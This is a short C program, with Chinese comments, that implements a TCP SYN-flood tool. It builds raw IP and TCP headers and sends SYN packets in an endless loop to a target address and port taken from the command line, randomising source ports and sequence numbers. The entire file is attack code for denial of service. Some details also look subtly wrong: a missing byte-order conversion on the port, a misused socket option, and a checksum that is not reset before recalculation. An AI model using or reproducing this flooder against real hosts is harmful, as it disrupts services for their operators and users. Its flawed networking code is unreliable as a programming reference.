#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>	//inet_aton 
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

struct packet
{
		struct iphdr ip_header;
		struct tcphdr tcp_header;
};

struct pseudo_header
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
};

unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char**argv)
{
	if(argc!=3)
	{
			printf("useage: %s ip port",argv[0]);
			exit(-1);
	}
	int fd;
	struct sockaddr_in target;
	struct packet data;
	struct pseudo_header pheader;
	fd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(fd==-1)
	{
			perror("socket error.\n");
			exit(-1);
	}
	setsockopt(fd,IPPROTO_TCP,IP_HDRINCL,NULL,0);
	bzero(&data,sizeof(struct packet));
	bzero(&pheader,sizeof(struct pseudo_header));
	
	target.sin_family=AF_INET;
	target.sin_port=htons(atoi(argv[2]));
	if( 0 == inet_aton(argv[1],&target.sin_addr) )
	{
			perror("inet_aton error.\n");
			exit(-1);
	}
	
	data.tcp_header.dest=(unsigned int)atoi(argv[2]); 	//目的端口号
	data.tcp_header.syn=1;
	data.tcp_header.doff=5;		//TCP 20个字节首部长度
	data.tcp_header.window=htons(200);
	
	data.ip_header.version=4;
	data.ip_header.ihl=5;
	data.ip_header.tos=0;
	data.ip_header.tot_len=htons(40);
	data.ip_header.ttl=255;
	data.ip_header.protocol=IPPROTO_TCP;
	data.ip_header.saddr=INADDR_ANY;
	data.ip_header.daddr=target.sin_addr.s_addr;
	data.ip_header.check=check_sum((unsigned short*)&data.ip_header,20);
	
	//TCP伪首部的构造：源地址。目标地址。协议类型。tcp首部
	pheader.dest_address=target.sin_addr.s_addr; // ???
	pheader.protocol=IPPROTO_TCP;
	pheader.tcp_length=htons(20);
	pheader.placeholder=0;
	pheader.source_address=data.ip_header.saddr;
	while(1)
	{
		data.tcp_header.source=htons(1025+rand()%50000);
		data.tcp_header.seq=1993+rand()%8229;
		bcopy(&data.tcp_header,&pheader.tcp,20);
		data.tcp_header.check=check_sum((unsigned short*)&pheader,32);
		sendto(fd,&data,sizeof(data),0,(struct sockaddr*)&target,sizeof(target));
		printf(".");
	}
	return 0;
}


unsigned short check_sum(unsigned short *addr,int len)
{
	register int nleft=len;
	register int sum=0;
	register short *w=addr;
	  short answer=0;
	 
	while(nleft>1)
	{
	  sum+=*w++;
	  nleft-=2;
	}
	if(nleft==1)
	{
	  *(unsigned char *)(&answer)=*(unsigned char *)w;
	  sum+=answer;
	}
	   
	sum=(sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer=~sum;
	return(answer);
}
